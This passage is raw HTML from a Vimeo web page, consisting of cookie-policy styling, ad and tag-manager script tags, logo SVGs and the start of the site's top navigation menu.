table{border-collapse:inherit}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy{font-family:inherit;font-size:1rem}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title{color:dimgray}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description{margin-bottom:1em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup{margin-left:1.5em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td{font-size:.9em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td span,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td a{font-size:inherit}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group{font-size:1em;margin-bottom:.6em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title{margin-bottom:1.2em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section{margin-bottom:1em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th{min-width:75px}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover{background:#fff}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead{background-color:#f6f6f4;font-weight:bold}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border{display:none}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section{margin-bottom:2em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li{list-style:disc;margin-left:1.5em}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4{display:inline-block}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table{border-collapse:inherit;margin:auto;border:1px solid #d7d7d7;border-radius:5px;border-spacing:initial;width:100%;overflow:hidden}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td{border-bottom:1px solid #d7d7d7;border-right:1px solid #d7d7d7}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td{border-bottom:0px}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child{border-right:0px}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type{width:25%}.ot-sdk-cookie-policy[dir=rtl]{text-align:left}#ot-sdk-cookie-policy h3{font-size:1.5em}@media only screen and (max-width: 530px){.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr{display:block}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr{position:absolute;top:-9999px;left:-9999px}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr{margin:0 0 1em 0}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a{background:#f6f6f4}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td{border:none;border-bottom:1px solid #eee;position:relative;padding-left:50%}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before{position:absolute;height:100%;left:6px;width:40%;padding-right:10px}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border{display:inline-block;background-color:#e4e4e4;position:absolute;height:100%;top:0;left:45%;width:2px}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before{content:attr(data-label);font-weight:bold}.ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li{word-break:break-word;word-wrap:break-word}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table{overflow:hidden}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td{border:none;border-bottom:1px solid #d7d7d7}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr{display:block}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type{width:auto}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr{margin:0 0 1em 0}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before{height:100%;width:40%;padding-right:10px}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before{content:attr(data-label);font-weight:bold}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li{word-break:break-word;word-wrap:break-word}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr{position:absolute;top:-9999px;left:-9999px;z-index:-9999}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td{border-bottom:1px solid #d7d7d7;border-right:0px}#ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child{border-bottom:0px}}
                
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
                        color: #696969;
                    }
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
                        color: #696969;
                    }
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
                        color: #696969;
                    }
                    
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
                            color: #696969;
                        }
                    
            
                    #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
                            background-color: #F8F8F8;
                        }
                    
            .ot-floating-button__front{background-image:url('https://optanon.blob.core.windows.net/logos/static/ot_persistent_cookie.png')}</style><script async="" type="text/javascript" class="optanon-category-C0002" src="https://www.googletagservices.com/tag/js/gpt.js"></script><script async="" type="text/javascript" class="optanon-category-C0002" src="https://vimeo.com//www.googletagmanager.com/gtm.js?id=GTM-RBKK&amp;l=_gtm"></script><meta http-equiv="origin-trial" content="AzoawhTRDevLR66Y6MROu167EDncFPBvcKOaQispTo9ouEt5LvcBjnRFqiAByRT+2cDHG1Yj4dXwpLeIhc98/gIAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A6+nc62kbJgC46ypOwRsNW6RkDn2x7tgRh0wp7jb3DtFF7oEhu1hhm4rdZHZ6zXvnKZLlYcBlQUImC4d3kKihAcAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/9La288e7MDEU2ifusFnMg1C2Ij6uoa/Z/ylwJIXSsWfK37oESIPbxbt4IU86OGqDEPnNVruUiMjfKo65H/CQwAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><script src="https://securepubads.g.doubleclick.net/gpt/pubads_impl_2022071901.js" async=""></script></head>
    <body class="logged_out_join min_width">
        <div id="wrap">
            <div id="main">
                
<div id="ribbon" class="VimeoBrand_ColorRibbon"></div>


<style>
    @-webkit-keyframes record_animation {
        0%, 20%, 50%, 80%, 100% {
            -webkit-transform: translateY(0);
            transform: translateY(0);
        }
        40% {
            -webkit-transform: translateY(2px);
            transform: translateY(2px);
        }
        60% {
            -webkit-transform: translateY(3px);
            transform: translateY(3px);
        }
    }

    @keyframes record_animation {
        0%, 20%, 50%, 80%, 100% {
            -webkit-transform: translateY(0);
            transform: translateY(0);
        }
        40% {
            -webkit-transform: translateY(2px);
            transform: translateY(2px);
        }
        60% {
            -webkit-transform: translateY(3px);
            transform: translateY(3px);
        }
    }

    .logged_out_record_animation {
        animation: record_animation 1.5s .25s 5;
    }

    .logged_in_record_animation {
        animation: record_animation 1.5s .25s infinite;
    }

    .new_label {
        text-transform: uppercase;
        color: #fff;
        border-radius: 2px;
        height: 20px;
        line-height: 20px;
        margin-left: 8px;
        font-size: 10px;
        font-weight: 700;
        padding: 0 2px;
        text-align: center;
    }

</style>

<script>
    window.vimeo = window.vimeo || {};
</script>

<div id="topnav_desktop" class="topnav_desktop " role="banner">
    <div class="topnav_desktop_wrapper">

                            <a class="topnav_desktop_logo" href="https://vimeo.com//vimeo.com" alt="Go to Vimeo home page" aria-label="Go to Vimeo home page" data-fatal-attraction="container:top_nav|component:vimeo_home" data-gtm-click="top_nav_home_click">
                                    <svg alt="Vimeo" width="100" height="40"><path d="M22.448 14.575c-.104 2.17-1.618 5.146-4.544 8.912-3.03 3.942-5.59 5.912-7.686 5.912-1.297 0-2.397-1.204-3.3-3.6-.6-2.2-1.202-4.398-1.794-6.598-.664-2.396-1.38-3.6-2.147-3.6-.166 0-.747.354-1.753 1.05l-1.048-1.35c1.1-.965 2.19-1.93 3.257-2.905 1.463-1.265 2.573-1.94 3.3-2.002 1.732-.166 2.8 1.017 3.205 3.558.435 2.74.736 4.44.902 5.115.498 2.27 1.048 3.402 1.65 3.402.466 0 1.172-.737 2.105-2.21.934-1.473 1.432-2.593 1.504-3.37.133-1.277-.365-1.91-1.506-1.91-.53 0-1.08.125-1.65.364 1.1-3.59 3.186-5.333 6.277-5.23 2.273.073 3.35 1.556 3.227 4.46m13.755 7.034c-.933 1.764-2.22 3.37-3.86 4.803-2.24 1.93-4.47 2.905-6.7 2.905-1.037.002-1.826-.33-2.376-.994-.55-.663-.81-1.535-.777-2.603.03-1.1.372-2.8 1.025-5.104.654-2.303.976-3.537.976-3.703 0-.86-.3-1.297-.902-1.297-.198 0-.77.353-1.702 1.048l-1.152-1.35c1.07-.962 2.137-1.927 3.206-2.902 1.43-1.266 2.5-1.94 3.205-2.002 1.1-.103 1.91.23 2.428.976.518.747.705 1.722.58 2.915-.435 2.034-.902 4.607-1.4 7.73-.03 1.43.488 2.146 1.556 2.146.467 0 1.297-.498 2.5-1.483.996-.82 1.815-1.598 2.45-2.324l.942 1.244m-4.357-17.8c-.03.83-.446 1.628-1.255 2.395-.9.86-1.97 1.296-3.204 1.296-1.9 0-2.822-.83-2.75-2.49.032-.86.54-1.69 1.526-2.49.985-.797 2.074-1.19 3.278-1.19.705 0 1.286.27 1.753.82.467.54.684 1.1.653 1.66m35.612 17.8c-.933 1.763-2.22 3.37-3.86 4.802-2.24 1.93-4.47 2.904-6.7 2.904-2.168.002-3.216-1.202-3.153-3.598.03-1.07.238-2.355.622-3.85.384-1.503.59-2.665.623-3.505.03-1.265-.353-1.898-1.152-1.898-.87 0-1.91 1.036-3.112 3.1-1.276 2.168-1.96 4.274-2.064 6.308-.073 1.43.072 2.54.425 3.298-2.324.064-3.963-.32-4.886-1.15-.83-.737-1.212-1.95-1.15-3.652.03-1.068.198-2.137.488-3.205.29-1.07.457-2.023.488-2.853.062-1.234-.384-1.857-1.35-1.857-.84 0-1.74.955-2.706 2.853-.966 1.9-1.505 3.89-1.61 5.956-.06 1.867.053 3.174.364 3.9-2.293.062-3.92-.415-4.876-1.452-.798-.86-1.16-2.18-1.1-3.942.032-.86.188-2.075.457-3.62.28-1.546.425-2.75.457-3.62.062-.603-.083-.903-.446-.903-.197 0-.768.34-1.702 1.015l-1.203-1.348c.168-.135 1.216-1.1 3.156-2.905 1.4-1.297 2.354-1.97 2.852-2.002.872-.073 1.567.29 2.106 1.08.53.787.8 1.69.8 2.727 0 .332-.032.654-.105.954.497-.766 1.08-1.43 1.752-2 1.537-1.34 3.26-2.086 5.157-2.252 1.64-.135 2.8.25 3.505 1.152.57.736.83 1.784.8 3.153.237-.198.486-.416.746-.654.767-.903 1.514-1.62 2.25-2.148 1.235-.902 2.52-1.4 3.86-1.504 1.597-.135 2.75.25 3.454 1.152.602.726.87 1.774.8 3.143-.032.933-.26 2.28-.675 4.065-.416 1.773-.624 2.8-.624 3.07-.03.695.03 1.182.197 1.442.166.27.57.394 1.203.394.467 0 1.297-.497 2.5-1.482.996-.82 1.816-1.598 2.45-2.324l.963 1.254m18.765-.052c-.965 1.598-2.874 3.195-5.706 4.793-3.538 2.032-7.127 3.05-10.758 3.05-2.706 0-4.636-.904-5.808-2.7-.83-1.233-1.234-2.696-1.203-4.407.03-2.698 1.234-5.27 3.6-7.71 2.603-2.665 5.674-4.003 9.21-4.003 3.27 0 5 1.328 5.208 3.994.135 1.702-.798 3.445-2.8 5.24-2.137 1.96-4.824 3.215-8.06 3.744.6.83 1.504 1.245 2.707 1.245 2.396 0 5.02-.613 7.863-1.837 2.033-.86 3.63-1.753 4.803-2.676l.945 1.265m-11.36-5.228c.032-.892-.33-1.35-1.1-1.35-.994 0-2.01.686-3.048 2.066-1.038 1.38-1.567 2.697-1.598 3.962-.02 0-.02.218 0 .643 1.63-.6 3.05-1.514 4.242-2.738.966-1.058 1.463-1.92 1.505-2.583m24.946 1.868c-.135 3.072-1.265 5.717-3.402 7.947-2.135 2.23-4.79 3.35-7.955 3.35-2.635 0-4.637-.85-6.006-2.55-.997-1.267-1.557-2.854-1.65-4.752-.166-2.863.86-5.498 3.1-7.894 2.408-2.665 5.427-3.993 9.057-3.993 2.334 0 4.098.788 5.3 2.344 1.132 1.443 1.65 3.29 1.557 5.55m-5.664-.185c.03-.903-.094-1.733-.374-2.48-.28-.747-.695-1.13-1.224-1.13-1.702 0-3.102.923-4.202 2.76-.933 1.503-1.43 3.11-1.504 4.812-.03.84.114 1.577.446 2.21.364.736.882 1.1 1.556 1.1 1.505 0 2.79-.883 3.86-2.656.892-1.472 1.38-3.008 1.44-4.615h.002z" fill="#112233"></path></svg>
                            </a>
            <a class="topnav_stock_logo" href="https://vimeo.com/stock">
                <svg alt="Vimeo" width="170" height="40" data-name="Layer 1" viewBox="0 0 780 120"><path d="M471.9 70.31c-12.14-2.74-24.28-3.9-24.28-12 0-6.5 8.82-7.66 13.59-7.66 7.22 0 13.73 2.17 15.17 10h17.2c-2-16.62-15.9-23-31.22-23-13.58 0-31.21 5.05-31.21 21.38 0 15.17 11.85 19.51 24 22.11s24 3.76 24.42 12.43c.43 8.52-10.4 9.82-16.62 9.82-8.81 0-16-3.46-16.9-13h-16.49c.29 17.63 14.31 26 33.09 26 15.46 0 33.38-6.5 33.38-24.28-.03-14.72-12.14-19.05-24.13-21.8zM525.66 17.28h-16.48v22.4h-12.42V52h12.42v44c.29 12.43 3.47 19.08 20.67 19.08 3.61 0 7.08-.58 10.69-.87v-12.68a28.52 28.52 0 0 1-6.94.57c-7.37 0-7.94-3.47-7.94-10.26V52h14.88V39.68h-14.88zM580.85 37.66c-24 0-37.71 16.47-37.71 39.3 0 23 13.73 39.45 37.71 39.45S618.57 99.94 618.57 77c0-22.87-13.73-39.34-37.72-39.34zm0 65.74c-14.73 0-21.24-13.4-21.24-26.4s6.51-26.3 21.24-26.3S602.1 64.1 602.1 77s-6.51 26.4-21.25 26.4zM662.79 50.66c9.1 0 15.75 4.91 17.05 14h16.47c-1.59-18.35-16.33-27-33.67-27-24.56 0-36.85 17.63-36.85 40.17 0 22 12.86 38.58 36.27 38.58 19.22 0 31.22-10.69 34.25-30.06h-16.47c-1.59 10.7-8.24 17.05-17.78 17.05-14.3 0-19.79-13.15-19.79-25.57 0-22.69 11.99-27.17 20.52-27.17zM742.26 67.13l28.61-27.45h-20.23l-29.76 30.2V11.21H704.4v103.18h16.48V87.65l9.82-9.53 22.83 36.27h20.09l-31.36-47.26z" fill="#fff"></path><path d="M117.25 26.72a18.37 18.37 0 0 0 13.14-5.31q4.92-4.69 5.13-9.8a9.62 9.62 0 0 0-2.67-6.84 9.08 9.08 0 0 0-7.18-3.37 20.91 20.91 0 0 0-13.45 4.9q-6.06 4.91-6.26 10.21-.4 10.22 11.29 10.21zM386.12 38.25q-22.38 0-37.15 16.39Q335.2 69.4 336.24 87c.05.86.12 1.7.22 2.53l-1.54.68q-17.46 7.52-32.23 7.51-7.4 0-11.09-5.12 19.9-3.27 33-15.35 12.4-11.03 11.54-21.47-1.23-16.37-21.34-16.38-21.8 0-37.8 16.42-14.56 15-14.77 31.6a37.57 37.57 0 0 0 .27 5.37c-2.29 1.51-4 2.27-5.2 2.27q-3.9 0-4.92-1.63c-.69-1.09-1-3.06-.83-5.93q0-1.64 2.57-12.57t2.77-16.67q.4-8.37-3.28-12.88-4.32-5.52-14.17-4.7a30.42 30.42 0 0 0-15.8 6.16 54.57 54.57 0 0 0-9.23 8.82c-1.1 1-2.12 1.86-3.08 2.67q.19-8.41-3.28-12.93-4.32-5.53-14.38-4.72a36.46 36.46 0 0 0-21.13 9.24 37.67 37.67 0 0 0-7.19 8.21 18.15 18.15 0 0 0 .41-3.9A19.42 19.42 0 0 0 162.5 43q-3.28-4.82-8.62-4.41-3.07.21-11.69 8.21-11.91 11.08-12.93 11.9l4.92 5.54c3.83-2.76 6.16-4.15 7-4.15q2.25 0 1.85 3.68a114.11 114.11 0 0 1-1.89 14.84c-.7 3.94-1.2 7.33-1.52 10.19l-.18.15q-7.39 6.08-10.26 6.07c-4.38 0-6.5-2.92-6.37-8.79q3.08-19.22 5.76-31.69.81-7.36-2.37-12t-10-4q-4.32.4-13.14 8.21L97 52.39c-.41-9.68-4.82-14.66-13.28-14.91q-19-.6-25.74 21.46a17.19 17.19 0 0 1 6.76-1.5q7 0 6.16 7.84-.46 4.72-6.2 13.81t-8.62 9.06q-3.69 0-6.77-14-1-4.11-3.69-21-2.47-15.54-13.14-14.52Q28 39 18.94 46.84q-6.57 6-13.34 11.9l4.3 5.54Q16.05 60 17.07 60q4.71 0 8.81 14.76l7.38 27.06q5.52 14.76 13.51 14.76 12.92 0 31.55-24.24 13.1-16.84 17-28.5c3.44-2.55 5.57-3.84 6.35-3.84q3.69 0 3.69 5.33 0 1-4 15.18t-4.2 20.92q-.21 6.57 3.18 10.66c2.25 2.74 5.51 4.11 9.75 4.11q13.75 0 27.5-11.9c.82-.71 1.61-1.44 2.39-2.18a16.51 16.51 0 0 0 3.77 7.56q5.93 6.34 20 5.93-1.89-4.52-1.47-16a59.7 59.7 0 0 1 6.57-24.43q6-11.68 11.1-11.7 6 0 5.55 7.59a53.13 53.13 0 0 1-2 11.71 55.23 55.23 0 0 0-2 13.13q-.41 10.47 4.71 15 5.73 5.13 20.05 4.72-2.13-4.71-1.72-13.54.6-12.52 8.44-25.86 7.41-12.72 12.76-12.73 5 0 4.74 7.8a74.94 74.94 0 0 1-2.56 14.36 74.61 74.61 0 0 0-2.57 15.79q-.41 14.78 12.94 14.77 13.74 0 27.5-11.9l.44-.4c.32.54.64 1.08 1 1.6q7.19 11.08 23.81 11.08 22.36 0 44.13-12.5c1.63-.92 3.17-1.83 4.65-2.75a29.43 29.43 0 0 0 3.24 5.18q8.42 10.45 24.63 10.45 19.5 0 32.64-13.73a48.79 48.79 0 0 0 14-32.58q.61-13.93-6.36-22.75-7.49-9.65-21.85-9.67zm-97.76 46.56a11.12 11.12 0 0 1 0-2.66q.19-7.75 6.55-16.23t12.5-8.48c3.15 0 4.65 1.85 4.51 5.52q-.19 4.08-6.14 10.62a46.25 46.25 0 0 1-17.42 11.23zM391 69.85a39 39 0 0 1-6 18.92q-6.57 10.91-15.81 10.9-4.11 0-6.36-4.52a17.66 17.66 0 0 1-1.85-9.05 39.81 39.81 0 0 1 6.16-19.74q6.86-11.31 17.33-11.31c2.19 0 3.86 1.54 5 4.63A25.82 25.82 0 0 1 391 69.85z" fill="#00adef"></path></svg>
            </a>
        
                            <nav class="topnav_desktop_menu" role="navigation" aria-label="Main menu">
                <ul class="topnav_menu_desktop_main" role="menubar">
                                                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_left" data-menu-id="why_vimeo" data-fatal-attraction-impression="container:top_nav|component:why_vimeo_menu|keyword:why_vimeo_hover">
                            <a onclick="event.preventDefault();event.target.blur();" class="topnav_menu_no_link topnav_has_dropdown" href="#" rel="toggle" role="button" aria-owns="topnav_why_vimeo">
                                Why Vimeo?                                                                    <div class="topnav_dropdown_arrow">
                                        <svg width="20px" height="20px" viewBox="0 0 24 24">
                                            <path d="M12 15.5a1 1 0 0 1-.67-.26l-5-4.5 1.34-1.48L12 13.15l4.33-3.9 1.34 1.49-5 4.5a1 1 0 0 1-.67.26z" fill="#657987"></path>
                                        </svg>
                                    </div>
                                                            </a>
                                                                                        <div class="topnav_desktop_menu_items_dropdown row_flex" role="menu" aria-hidden="true" id="topnav_why_vimeo">
                                    <ul class="row_elements">
                                                                                        <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>Overview</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:solutions|keyword:marketing" href="https://vimeo.com/solutions/marketing">Market your business</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:solutions|keyword:communications" href="https://vimeo.com/solutions/communications">Communicate internally</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:collaborate_on_video" href="https://vimeo.com/features/video-collaboration">Collaborate on video</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:monetize_your_video" href="https://vimeo.com/ott?mkc=entprsb">Monetize your videos</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                                    <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>User type</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:enterprise" href="https://vimeo.com/enterprise">Enterprise</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:solutions|keyword:small_business" href="https://vimeo.com/solutions/small-business-solutions">Small business</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:solutions|keyword:creative_professionals" href="https://vimeo.com/solutions/creative-professionals-solutions">Creative professionals</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                                    <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>Industry</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:solutions|keyword:fitness" href="https://vimeo.com/solutions/fitness-solutions">Fitness</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:solutions|keyword:faith" href="https://vimeo.com/solutions/faith-solutions">Faith</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:solutions|keyword:education" href="https://vimeo.com/solutions/education-solutions">Education</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:ecommerce" href="https://vimeo.com/create/ecommerce">Ecommerce</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:why_vimeo|keyword:real_estate" href="https://vimeo.com/create/real-estate">Real estate</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                        </ul>
                                                                                                        </div>
                            
                        </li>
                                                                                            <li class="topnav_desktop_menu_items topnav_desktop_menu_items_left" data-menu-id="features" data-fatal-attraction-impression="container:top_nav|component:features_menu|keyword:livestream_highlight">
                            <a onclick="event.preventDefault();event.target.blur();" class="topnav_menu_no_link topnav_has_dropdown" href="#" rel="toggle" role="button" aria-owns="topnav_features">
                                Features                                                                    <div class="topnav_dropdown_arrow">
                                        <svg width="20px" height="20px" viewBox="0 0 24 24">
                                            <path d="M12 15.5a1 1 0 0 1-.67-.26l-5-4.5 1.34-1.48L12 13.15l4.33-3.9 1.34 1.49-5 4.5a1 1 0 0 1-.67.26z" fill="#657987"></path>
                                        </svg>
                                    </div>
                                                            </a>
                                                                                        <div class="topnav_desktop_menu_items_dropdown row_flex" role="menu" aria-hidden="true" id="topnav_features">
                                    <ul class="row_elements">
                                                                                        <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>Create</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:interactive_video" href="https://vimeo.com/features/interactive-video">Interactive video</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:live_streaming" href="https://vimeo.com/features/livestreaming?mkc=368ip_fc_live">Live stream</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:screen_recorder" href="https://vimeo.com/features/screen-recorder">Screen record</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:create" href="https://vimeo.com/create">Create from templates</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:for_hire" href="https://vimeo.com/for-hire">Hire a video pro</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:stock" href="https://vimeo.com/stock">License stock footage</a>
                                                            </li>
                                                                                                            </ul>
                                                </li>
                                                                                                                                    <li class="topnav_desktop_menu_items_dropdown_item--multilevel" role="menuitem" tabindex="-1">
                                                    <h2>Manage</h2>
                                                    <ul role="menu" aria-hidden="true">
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:video_library" href="https://vimeo.com/features/video-library?mkc=368ip_fm_vl">Video library</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:video_player" href="https://vimeo.com/features/video-player?mkc=368ip_fm_adfree">Ad-free player</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
                                                                <a data-fatal-attraction="container:top_nav|component:product|keyword:hosting" href="https://vimeo.com/features/online-video-hosting?mkc=368ip_fm_hosting">Hosting</a>
                                                            </li>
                                                                                                                    <li role="menuitem" tabindex="-1">
